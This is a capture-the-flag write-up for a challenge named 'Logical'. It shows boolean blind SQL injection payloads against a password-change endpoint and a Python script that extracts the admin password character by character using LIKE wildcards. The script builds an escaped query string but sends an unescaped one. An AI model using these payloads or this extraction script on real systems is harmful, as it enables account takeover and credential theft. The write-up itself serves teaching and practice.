# Logical

Author: `Mr. Blade`

## Description

The administrator changed their password, and we lost access to their account. We need to regain access to continue our operations.

## Dev notes

<b>No Source code for this challenge</b>

Start: `make run`

Stop: `make stop`

## Solution
So the page mentions database so likely an SQL challenge of some sort. Looking at main.js it is making POSTS to an endpoint /api/chpass with a username, and the server responds with whether or not it exists.

First let's see how we can get sql injection. Tried a bunch of things, got several 500s, but eventually the following payload got me a 200:
```
admin' or ''%3D'
```
The %3D is an html encoded equals sign, since forms don't like having equals signs in them
And the idea is that the query looks like:
```
SELECT * FROM table WHERE username='{username}'
```

so our payload effectively does
```
SELECT * FROM table WHERE username='admin' or ''=''
```


So from there since we have a boolean response of exists or not exists, and I'm assuming the flag is in pthe password we can do something like:
```
admin' and password like 'g%
```

and this will inject as
```
SELECT * FROM table WHERE username='admin' AND password LIKE 'g%'
```
the % symbol is a wildcard for zero or more characters, so this checks if the password starts with a g or not and we can guess the password one letter at a time using the server's response

Note: be careful with wildcards, as they may mess up your results with false positives if not escaped properly, and I spent quite a bit of time fiddling with the charset because because of it

Solve in `solve.py` and below.
``` py
import requests
from string import ascii_letters, digits
charset = ascii_letters + digits + '!@#$^&*(){}-_'
pw = 'gigem{'
while pw[-1] != '}':
    for c in charset:
        inject = f"admin' and password like '{pw}"
        if c not in '%_[]^-':
            inject += f"{c}%"
        else:
            inject += f"\\{c}% escape '\\'"
        res = requests.post('http://127.0.0.1/api/chpass', data = {"username":f"admin' and password like '{pw}{c}%"})
        if 'not exists' not in res.text:
            pw += c
            print(pw)
            break
```

flag: `gigem{bl1nd-1nj3ct10n}`
